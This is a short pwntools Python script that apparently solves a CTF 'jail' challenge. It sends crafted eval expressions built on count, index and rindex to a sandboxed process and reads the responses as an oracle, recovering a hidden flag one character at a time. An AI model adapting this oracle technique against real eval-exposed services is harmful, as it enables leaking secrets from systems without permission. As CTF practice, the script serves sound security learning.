#!/usr/bin/env python3


from pwn import *

def count_letters():
	l=[]
	for i in range(32,127):
		j=0
		m=False
		print("i = ",i)
		while m==False:
			p="flag.encode().count({i})is({j})and(0)".format(i=i,j=j)
			chall.sendline(p)
			
			chall.recvline()
			s=str(chall.recvline())[2:15]
			#print(s)
			
			#s=str(chall.recvline())[10:23]
			if s=="<class 'int'>":
				if j!=0:
					l.append([chr(i),j])
				m=True
			else:
				j+=1
	return l


def get_flag_length(l):
	k=0
	for i in l:
		k+=i[1]
	return k


def construct_flag(counted_letters,flag_length):
	flag='*'*flag_length

	print("first index")
	for i in counted_letters:
		j=0
		m=False
		print("letter : ",i[0])
		for j in range(0,flag_length):
			p="flag.encode().index({carac})is({j})and(0)".format(carac=ord(i[0]),j=j)
			chall.sendline(p)
			
			chall.recvline()
			s=str(chall.recvline())[2:15]			
			#s=str(chall.recvline())[10:23]
			if s=="<class 'int'>":
				flag=flag[:j]+i[0]+flag[(j+1):]
				print(flag)
				break
			else:
				j+=1

	print("Last index")
	for i in counted_letters:
		j=0
		m=False
		if i[1]>=2:
			print("letter : ",i[0])
			for j in range(0,flag_length):
				p="flag.encode().rindex({carac})is({j})and(0)".format(carac=ord(i[0]),j=j)
				chall.sendline(p)
				
				chall.recvline()
				s=str(chall.recvline())[2:15]				
				#s=str(chall.recvline())[10:23]
				if s=="<class 'int'>":
					flag=flag[:j]+i[0]+flag[(j+1):]
					print(flag)
					break
				else:
					j+=1
	return flag

chall=process(['./jail.py'])
#chall=remote("jail.chal.ctf.gdgalgiers.com",1304)
counted_letters=count_letters()
print(counted_letters)
flag_length=get_flag_length(counted_letters)
print("flag length: ",get_flag_length(counted_letters))
print(construct_flag(counted_letters,flag_length))
chall.close()